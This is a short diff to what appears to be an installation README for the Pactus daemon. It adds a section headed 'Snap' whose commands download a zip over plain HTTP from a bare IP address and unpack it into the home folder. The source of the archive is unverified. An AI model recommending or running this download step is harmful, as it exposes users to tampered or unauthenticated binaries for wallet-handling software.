@@ -91,3 +91,11 @@ cd pactus-cli_1.1.4
 ```
 ./pactus-daemon start -w ~/pactus
 ```
+### Snap
+```
+wget -P $HOME http://37.120.189.81/pactus/pactus.zip
+unzip -d $HOME/pactus $HOME/pactus.zip
+```
+
+
+
